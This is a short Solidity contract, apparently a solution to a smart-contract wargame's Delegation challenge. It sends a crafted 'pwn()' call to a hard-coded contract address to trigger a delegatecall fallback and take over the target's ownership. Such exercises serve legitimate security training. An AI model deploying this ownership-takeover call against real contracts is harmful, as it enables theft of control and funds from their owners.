// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

    address target = 0x97737be6b793e36465C2B659436b27aec1f69213;

    function pwn_delegate() public {
        bytes memory payload = abi.encodeWithSignature("pwn()");
        (bool success, ) = target.call(payload);
        
        assert(success);
    }
}